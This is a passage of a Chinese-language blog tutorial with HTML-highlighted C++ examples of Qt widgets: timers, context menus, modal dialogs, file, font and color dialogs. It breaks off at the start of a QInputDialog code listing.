class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++">QtWidgetsApplication1::<span class="hljs-built_in">QtWidgetsApplication1</span>(QWidget *parent)<br>    : <span class="hljs-built_in">QMainWindow</span>(parent)<br>&#123;<br>    ui.<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br><br>    QTimer* qTimer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">QTimer</span>(<span class="hljs-keyword">this</span>);<br><br>    qTimer-&gt;<span class="hljs-built_in">setTimerType</span>(Qt::PreciseTimer); <br><br>    <span class="hljs-built_in">connect</span>(ui.point, &amp;QPushButton::clicked, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        <span class="hljs-keyword">if</span> (qTimer-&gt;<span class="hljs-built_in">isActive</span>()) &#123;<br>            qTimer-&gt;<span class="hljs-built_in">stop</span>();<br>            ui.point-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;begin&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            qTimer-&gt;<span class="hljs-built_in">start</span>(<span class="hljs-number">100</span>);<br>            ui.point-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;close&quot;</span>);<br>        &#125;<br>    &#125;);<br><br>    <span class="hljs-built_in">connect</span>(qTimer, &amp;QTimer::timeout, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QTime tm = QTime::<span class="hljs-built_in">currentTime</span>();<br>        QString curTime = tm.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&quot;hh:mm:ss.zzz&quot;</span>);<br>        ui.curTime-&gt;<span class="hljs-built_in">setText</span>(curTime);<br><br><br>    &#125;);<br>    <br><br><br>    <span class="hljs-built_in">connect</span>(ui.oncePoint, &amp;QPushButton::clicked, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QTimer::<span class="hljs-built_in">singleShot</span>(<span class="hljs-number">2000</span>, <span class="hljs-keyword">this</span>, [=]() &#123;<br>            QTime tm = QTime::<span class="hljs-built_in">currentTime</span>();<br>            QString curTime = tm.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&quot;hh:mm:ss.zzz&quot;</span>);<br>            ui.onceTime-&gt;<span class="hljs-built_in">setText</span>(curTime);<br>            &#125;);<br>        &#125;);<span class="hljs-comment">//实现的是一次获取时间</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="窗口类"><a href="#窗口类" class="headerlink" title="窗口类"></a>窗口类</h2><h3 id="QWidGet"><a href="#QWidGet" class="headerlink" title="QWidGet"></a>QWidGet</h3><ol><li><p>QWidGet的基本设置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//设置图标</span><br><span class="hljs-built_in">setWindowIcon</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;C:\\Users\\12414\\OneDrive - cuit.edu.cn\\图片\\本机照片\\下载 (2).png&quot;</span>));<br>   <br><span class="hljs-comment">//设置标题</span><br><span class="hljs-built_in">setWindowTitle</span>(<span class="hljs-string">&quot;陈宏刚&quot;</span>);<br>   <br>   <br><span class="hljs-comment">//移动</span><br><span class="hljs-function">QPoint <span class="hljs-title">movePoint</span><span class="hljs-params">(<span class="hljs-number">800</span>, <span class="hljs-number">800</span>)</span></span>;<br><span class="hljs-built_in">move</span>(movePoint);<br>   <br>   <br><span class="hljs-comment">//将按钮附上text</span><br>ui.changeSize-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;改变大小&quot;</span>);<br>ui.getInfo-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;得到信息&quot;</span>);<br>ui.move-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;改变位置&quot;</span>);<br>ui.modefyBth-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;改变窗口&quot;</span>);<br>   <br>   <br><span class="hljs-comment">//当标题和图标发生变化的时候</span><br><span class="hljs-built_in">connect</span>(<span class="hljs-keyword">this</span>, &amp;QWidget::windowIconChanged, <span class="hljs-keyword">this</span>, [=]() &#123;<br>    <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;你的图标已经改变&quot;</span>;<br>    &#125;);<br>   <br><span class="hljs-built_in">connect</span>(<span class="hljs-keyword">this</span>, &amp;QWidget::windowTitleChanged, <span class="hljs-keyword">this</span>, [=]() &#123;<br>    <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;你的标题已经改变&quot;</span>;<br>    &#125;);<br>   <br></code></pre></td></tr></table></figure></li><li><p>添加右键菜单 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">   <br><span class="hljs-comment">//添加右键菜单</span><br><span class="hljs-built_in">setContextMenuPolicy</span>(Qt::CustomContextMenu);<br><span class="hljs-built_in">connect</span>(<span class="hljs-keyword">this</span>,&amp;QWidget::customContextMenuRequested, <span class="hljs-keyword">this</span>, [=](<span class="hljs-type">const</span> QPoint&amp;pos) &#123;<br>    QMenu <span class="hljs-built_in">menu</span>(<span class="hljs-literal">nullptr</span>);<span class="hljs-comment">//右键菜单</span><br>    menu.<span class="hljs-built_in">addAction</span>(<span class="hljs-string">&quot;chg&quot;</span>);<span class="hljs-comment">//添加选项</span><br>    menu.<span class="hljs-built_in">addAction</span>(<span class="hljs-string">&quot;zjy&quot;</span>);<br>    menu.<span class="hljs-built_in">addAction</span>(<span class="hljs-string">&quot;xxp&quot;</span>);<br>    menu.<span class="hljs-built_in">exec</span>(QCursor::<span class="hljs-built_in">pos</span>());<span class="hljs-comment">//获取右键的位置，exec相当于生成函数，在此处生成 </span><br>    &#125;);<br></code></pre></td></tr></table></figure></li><li><p>模块对话框，就是有当前的焦点</p></li></ol><h3 id="QDialog"><a href="#QDialog" class="headerlink" title="QDialog"></a>QDialog</h3><ol><li><p>使用模块对话框</p><ul><li>首先得有一个dialog的类</li><li>然后再这个类里面做一些操作</li><li>然后主窗口调用这个类</li></ul><p>下面是主窗口的代码，主要是用于接受信号，创建类</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">qtTest::on_modalDialog_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    MyDialog myDialog;<br>   <br>   <br>    <span class="hljs-comment">//信号处理放在前面，因为不能再销毁，也就是exec之后检测</span><br>    <span class="hljs-comment">//检测是什么信号</span><br>    <span class="hljs-built_in">connect</span>(&amp;myDialog, &amp;QDialog::finished, <span class="hljs-keyword">this</span>, [=](<span class="hljs-type">int</span> ret) &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;this is finished,ret is: &quot;</span> &lt;&lt; ret;<br>        &#125;);<br>   <br>   <br>    <span class="hljs-comment">//accepted,rejected没有返回值</span><br>    <span class="hljs-built_in">connect</span>(&amp;myDialog, &amp;QDialog::accepted, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;accepted &quot;</span>;<br>        &#125;);<br>   <br>    <span class="hljs-built_in">connect</span>(&amp;myDialog, &amp;QDialog::rejected, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;this is rejected&quot;</span>;<br>        &#125;);<br>   <br>    <span class="hljs-type">int</span> ret = myDialog.<span class="hljs-built_in">exec</span>();<span class="hljs-comment">//激活窗口</span><br>   <br>    <span class="hljs-keyword">if</span> (ret == QDialog::Accepted) &#123;<span class="hljs-comment">//通过接受信号，判断是什么退出</span><br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;accepted&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret == QDialog::Rejected) &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;rejected&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;done&quot;</span>;<br>    &#125;<br>&#125;  <br></code></pre></td></tr></table></figure><p>下面是dialog的代码</p><p>三个按钮代表三个不同的退出方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyDialog::on_acceptedBtn_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">accept</span>();<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyDialog::on_rejectedBtn_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">reject</span>();<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyDialog::on_doneBtn_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">done</span>(<span class="hljs-number">10</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="QMessageBox（消息提示框）"><a href="#QMessageBox（消息提示框）" class="headerlink" title="QMessageBox（消息提示框）"></a>QMessageBox（消息提示框）</h4><p>给用户做交互用的</p><ol><li><p>static public function</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230729140256470.png" alt="image-20230729140256470"></p><ul><li><p><code>about</code>()</p><p>指定一个父窗口，指定一个标题，指定信息</p></li><li><p>aboutQt()</p><p>显示现在qt的信息</p></li></ul></li></ol><h4 id="QFileDialog-用于打开文件列表"><a href="#QFileDialog-用于打开文件列表" class="headerlink" title="QFileDialog(用于打开文件列表)"></a>QFileDialog(用于打开文件列表)</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230730083655196.png" alt="image-20230730083655196"></p><ol><li><p>常用的静态函数的用法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SAVAFILE</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">qtTest::on_modefyBth_2_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> OPENDIR</span><br>    QString dir = QFileDialog::<span class="hljs-built_in">getExistingDirectory</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;目录&quot;</span>,<br>        <span class="hljs-string">&quot;D:\\code\\vs\\vs2019_qt\\qtTest\\qtTest&quot;</span>);<br>    <span class="hljs-comment">//qDebug() &lt;&lt; &quot;your choose is:&quot; &lt;&lt; dir;</span><br>    QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;open file&quot;</span>,dir);<br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// OPENDIR</span></span><br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> OPENFILE</span><br>    QString dir = <span class="hljs-string">&quot;Text files (*txt)&quot;</span>;<br>    QString fileName = QFileDialog::<span class="hljs-built_in">getOpenFileName</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;openfile&quot;</span>,<br>        <span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\data.txt&quot;</span>,<br>        <span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;Images (*.png,*jpg);;Text files (*txt)&quot;</span>),&amp;dir);<br>    QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;open file&quot;</span>, <span class="hljs-string">&quot;你打开的文件是：&quot;</span> + fileName);<br>   <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// OPENFILE</span></span><br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> OPENFILES</span><br>    QString dir = <span class="hljs-string">&quot;Text files (*txt)&quot;</span>;<br>    QStringList fileNames = QFileDialog::<span class="hljs-built_in">getOpenFileNames</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;打开文件&quot;</span>,<br>        <span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\data.txt&quot;</span>,<br>        <span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;Images (*.png,*jpg);;Text files (*txt)&quot;</span>),&amp;dir);<br>    QString name;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : fileNames) &#123;<br>        name += item+<span class="hljs-string">&quot;   &quot;</span>;<br>    &#125;<br>    QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;你打开的文件&quot;</span>, name);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// OPENFILES</span></span><br>   <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SAVAFILE</span><br>    QString dir = <span class="hljs-string">&quot;Text files (*txt)&quot;</span>;<br>    QString fileName = QFileDialog::<span class="hljs-built_in">getSaveFileName</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;保存文件&quot;</span>,<br>        <span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\data.txt&quot;</span>,<br>        <span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;Images (*.png,*jpg);;Text files (*txt)&quot;</span>), &amp;dir);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// SAVAFILE</span></span><br>   <br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="QFontDialog（字体对话框类）"><a href="#QFontDialog（字体对话框类）" class="headerlink" title="QFontDialog（字体对话框类）"></a>QFontDialog（字体对话框类）</h4><h5 id="QFont-字体类"><a href="#QFont-字体类" class="headerlink" title="QFont(字体类)"></a>QFont(字体类)</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br>  QFont::<span class="hljs-built_in">QFont</span>();<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  参数:</span><br><span class="hljs-comment">    - family: 本地字库中的字体名, 通过 office 等文件软件可以查看</span><br><span class="hljs-comment">    - pointSize: 字体的字号</span><br><span class="hljs-comment">    - weight: 字体的粗细, 有效范围为 0 ~ 99</span><br><span class="hljs-comment">    - italic: 字体是否倾斜显示, 默认不倾斜</span><br><span class="hljs-comment">  */</span><br>  QFont::<span class="hljs-built_in">QFont</span>(<span class="hljs-type">const</span> QString &amp;family, <span class="hljs-type">int</span> pointSize = <span class="hljs-number">-1</span>, <span class="hljs-type">int</span> weight = <span class="hljs-number">-1</span>, <span class="hljs-type">bool</span> italic = <span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-comment">// 设置字体</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setFamily</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;family)</span></span>;<br>  <span class="hljs-comment">// 根据字号设置字体大小</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setPointSize</span><span class="hljs-params">(<span class="hljs-type">int</span> pointSize)</span></span>;<br>  <span class="hljs-comment">// 根据像素设置字体大小</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setPixelSize</span><span class="hljs-params">(<span class="hljs-type">int</span> pixelSize)</span></span>;<br>  <span class="hljs-comment">// 设置字体的粗细程度, 有效范围: 0 ~ 99</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setWeight</span><span class="hljs-params">(<span class="hljs-type">int</span> weight)</span></span>;<br>  <span class="hljs-comment">// 设置字体是否加粗显示</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setBold</span><span class="hljs-params">(<span class="hljs-type">bool</span> enable)</span></span>;<br>  <span class="hljs-comment">// 设置字体是否要倾斜显示</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setItalic</span><span class="hljs-params">(<span class="hljs-type">bool</span> enable)</span></span>;<br>  <br>  <span class="hljs-comment">// 获取字体相关属性(一般规律: 去掉设置函数的 set 就是获取相关属性对应的函数名)</span><br>  <span class="hljs-function">QString <span class="hljs-title">QFont::family</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">QFont::italic</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QFont::pixelSize</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QFont::pointSize</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">QFont::bold</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QFont::weight</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br></code></pre></td></tr></table></figure><ol><li><p>给一个窗口设置字体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">ui.changeFontLabel-&gt;<span class="hljs-built_in">setFont</span>(ft);<br></code></pre></td></tr></table></figure></li><li><p>使用QAppication给所有的窗口设置字体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">QApplication::<span class="hljs-built_in">setFont</span>(ft);<br></code></pre></td></tr></table></figure></li><li><p>下面是使用的方法</p><p>在一个槽函数里面调用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">qtTest::on_chengeFont_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">bool</span> ok;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    QFont ft = QFontDialog::<span class="hljs-built_in">getFont</span>(&amp;ok, <span class="hljs-built_in">QFont</span>(<span class="hljs-string">&quot;微软雅黑&quot;</span>,<span class="hljs-number">12</span>, QFont::Bold),<br>        <span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;选择字体&quot;</span>);<br>    <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;ok value is &quot;</span> &lt;&lt; ok;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    QFont ft = QFontDialog::<span class="hljs-built_in">getFont</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// 1</span></span><br>   <br>    ui.changeFontLabel-&gt;<span class="hljs-built_in">setFont</span>(ft);<br>    QApplication::<span class="hljs-built_in">setFont</span>(ft);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="QColorDialog"><a href="#QColorDialog" class="headerlink" title="QColorDialog"></a>QColorDialog</h4><h5 id="QColor颜色类"><a href="#QColor颜色类" class="headerlink" title="QColor颜色类"></a>QColor颜色类</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br>QColor::<span class="hljs-built_in">QColor</span>(Qt::GlobalColor color);<br>QColor::<span class="hljs-built_in">QColor</span>(<span class="hljs-type">int</span> r, <span class="hljs-type">int</span> g, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> a = ...);<br>QColor::<span class="hljs-built_in">QColor</span>();<br><br><span class="hljs-comment">// 参数设置 red, green, blue, alpha, 取值范围都是 0-255</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setRed</span><span class="hljs-params">(<span class="hljs-type">int</span> red)</span></span>;<span class="hljs-comment">// 红色</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setGreen</span><span class="hljs-params">(<span class="hljs-type">int</span> green)</span></span>;<span class="hljs-comment">// 绿色</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setBlue</span><span class="hljs-params">(<span class="hljs-type">int</span> blue)</span></span>;<span class="hljs-comment">// 蓝色</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setAlpha</span><span class="hljs-params">(<span class="hljs-type">int</span> alpha)</span></span>;<span class="hljs-comment">// 透明度, 默认不透明(255)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setRgb</span><span class="hljs-params">(<span class="hljs-type">int</span> r, <span class="hljs-type">int</span> g, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> a = <span class="hljs-number">255</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QColor::red</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QColor::green</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QColor::blue</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QColor::alpha</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::getRgb</span><span class="hljs-params">(<span class="hljs-type">int</span> *r, <span class="hljs-type">int</span> *g, <span class="hljs-type">int</span> *b, <span class="hljs-type">int</span> *a = <span class="hljs-literal">nullptr</span>)</span> <span class="hljs-type">const</span></span>;<br><br></code></pre></td></tr></table></figure><h4 id="QInputDialog"><a href="#QInputDialog" class="headerlink" title="QInputDialog"></a>QInputDialog</h4><ol><li><p>static public function</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 